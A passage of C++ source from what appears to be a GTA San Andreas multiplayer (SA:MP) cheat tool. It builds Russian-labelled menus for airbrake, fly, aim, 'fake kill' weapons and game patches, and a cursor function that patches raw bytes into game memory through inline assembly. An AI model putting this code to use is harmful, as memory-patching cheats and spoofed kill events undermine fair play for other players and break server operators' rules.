	TwAddVarRW(twBar_SPMisc, "ХУД АирБрейк в машине", TW_TYPE_BOOLCPP, &set.hud_indicator_inveh_airbrk, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Стик в машине", TW_TYPE_BOOLCPP, &set.hud_indicator_inveh_stick, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД БрейкДанс", TW_TYPE_BOOLCPP, &set.hud_indicator_inveh_brkdance, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Спайдер в пашине", TW_TYPE_BOOLCPP, &set.hud_indicator_inveh_spider, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Флай в машине", TW_TYPE_BOOLCPP, &set.hud_indicator_inveh_fly, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД АирБрейк пешком", TW_TYPE_BOOLCPP, &set.hud_indicator_onfoot_airbrk, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Стик пешком", TW_TYPE_BOOLCPP, &set.hud_indicator_onfoot_stick, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Флай пешком", TW_TYPE_BOOLCPP, &set.hud_indicator_onfoot_fly, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД АиМ", TW_TYPE_BOOLCPP, &set.hud_indicator_onfoot_aim, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Позиция", TW_TYPE_BOOLCPP, &set.hud_indicator_pos, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД FPS", TW_TYPE_BOOLCPP, &set.hud_fps_draw, " group='ХУД' ");
	TwDefine(" Разное/ХУД opened='false' ");

	TwAddVarRW(twBar_SPMisc, "FPS", TW_TYPE_INT32, &set.fps_limit, " label='FPS Limit' min=10 max=300 ");
	TwAddButton(twBar_SPMisc, "Оконный режим", menuToggleWndMode, NULL, NULL);	
	TwDefine(" Разное/Misc opened='false' ");

	// GTA Patches
	for(i = 0; i < INI_PATCHES_MAX; i++)
	{
		//if(set.patch[i].name == NULL) continue;
		//TwAddButton(twBar_SPPatches, set.patch[i].name, applyRemoveGTAPatch, (void *)&set.patch[i], NULL);
		if (set.patch[i].name == NULL) continue;
		TwAddVarCB(twBar_SPPatches, set.patch[i].name, TW_TYPE_BOOLCPP, SetPatchCallback, GetPatchCallback, (void *)&set.patch[i], NULL);
	}
	TwDefine(" GTA_Патчи opened='false' ");

	// SAMP
	if(g_dwSAMP_Addr != NULL)
	{
		// Players
		// to be populated by the hook
		TwDefine(" Игроки valueswidth=140 opened='false' ");

		// Servers
		TwAddVarRW(twBar_SAMPFavServers, "Текущий ник", TW_TYPE_BOOLCPP, &set.use_current_name, NULL);
		TwAddVarRW(twBar_SAMPFavServers, "Реконнект (ms)", TW_TYPE_INT32, &set.rejoin_delay, " min=25 max=999999999 ");
		TwAddButton(twBar_SAMPFavServers, " ", NULL, NULL, NULL);
		for(i = 0; i < INI_SERVERS_MAX; i++)
		{
			if(set.server[i].server_name == NULL) continue;
			TwAddButton(twBar_SAMPFavServers, set.server[i].server_name, joinServer, (void *)&set.server[i], NULL);
		}
		TwDefine(" Ваш_список_серверов opened='false' ");
	}

	if(g_dwSAMP_Addr != NULL)
	{
		for(i = 0; i < 45; i++)
		{
			snprintf(buf, sizeof(buf), " label='%s' group='ФейкКиллОружием' ", fk_weapons[i].Label);
			TwAddButton(twBar_SAMPMisc, NULL, changeFakeKillWeapon, &fk_weapons[i].Value, buf);
		}
		TwDefine(" СА:МП_Разное/ФейкКиллОружием label='ФейкКиллОружием' opened='false' ");

		TwAddVarRW(twBar_SAMPMisc, "Линии_чата", TW_TYPE_INT32, &set.d3dtext_chat_lines, " min=0 max=100 ");

		for(i = 0; i < 5; i++)
		{
			snprintf(buf, sizeof(buf), " label='%s' group='Статус_игры' ", game_states[i].Label);
			TwAddButton(twBar_SAMPMisc, NULL, changeGS, &game_states[i].Value, buf);
		}
		TwDefine(" СА:МП_Разное/Статус_игры label='Статус_игры' opened='false' ");

		for(i = 0; i < 17; i++)
		{
			snprintf(buf, sizeof(buf), " label='%s' group='Специальные_действия' ", special_actions[i].Label);
			TwAddButton(twBar_SAMPMisc, NULL, changeSpecialAction, &special_actions[i].Value, buf);
		}
		TwDefine(" СА:МП_Разное/Специальные_действия label='Специальные_действия' opened='false' ");

		TwAddButton(twBar_SAMPMisc, "Напитки", getDrunk, NULL, NULL);

		iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 100;
		iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 100;
		TwAddButton(twBar_SAMPMisc, "СА:МП_Обьекты", SAMPObjectsLinker, NULL, " label='СА:МП_Обьекты' ");
		sprintf(menuParameters," СА:МП_Обьекты label='СА:МП_Обьекты' color='255 0 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
		TwDefine(menuParameters);

		iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 125;
		iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 125;
		TwAddButton(twBar_SAMPMisc, "СА:МП_Пикапы", SAMPPickupsLinker, NULL, " label='СА:МП_Пикапы' ");
		sprintf(menuParameters," СА:МП_Пикапы label='СА:МП_Пикапы' color='255 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
		TwDefine(menuParameters);

		TwAddButton(twBar_SAMPMisc, "Загрузка команд соба", loadM0dCommands, NULL, NULL);


		TwDefine(" СА:МП_Разное valueswidth=140 ");
		
		// SA:MP Patches
		for(i = 0; i < INI_SAMPPATCHES_MAX; i++)
		{
			//if(set.sampPatch[i].name == NULL) continue;
			//TwAddButton(twBar_SAMPPatches, set.sampPatch[i].name, applyRemoveSAMPPatch, (void *)(UINT_PTR) i, NULL);
			if (set.sampPatch[i].name == NULL) continue;
			TwAddVarCB(twBar_SAMPPatches, set.sampPatch[i].name, TW_TYPE_BOOLCPP, SetPatchCallback, GetPatchCallback, (void *)&set.sampPatch[i], NULL);
		}
		//TwAddVarRW(twBar_SAMPPatches, "NOP Radio & PlayAudioStream", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggsdsd, NULL);

		
	}
}

void toggleCursor(bool bToggle)
{
	if(bToggle)
	{
		memcpy_safe((void *)0x53F41F, "\x33\xC0\x0F\x84", 4);
		memcpy_safe((void *)0xB73424, "\x00\x00\x00\x00", 4);
		memcpy_safe((void *)0xB73428, "\x00\x00\x00\x00", 4);
		_asm
		{
			mov edx, 0x541BD0
			call edx
			mov edx, 0x541DD0
			call edx
		}
		memcpy_safe((void *)0x6194A0, "\xC3", 1);
	}
	else
	{
		memcpy_safe((void *)0xB73424, "\x00\x00\x00\x00", 4);
		memcpy_safe((void *)0xB73428, "\x00\x00\x00\x00", 4);
		memcpy_safe((void *)0x53F41F, "\x85\xC0\x0F\x8C", 4);
		memcpy_safe((void *)0x6194A0, "\xE9", 1);
		SetCursor(NULL);
	}
}

 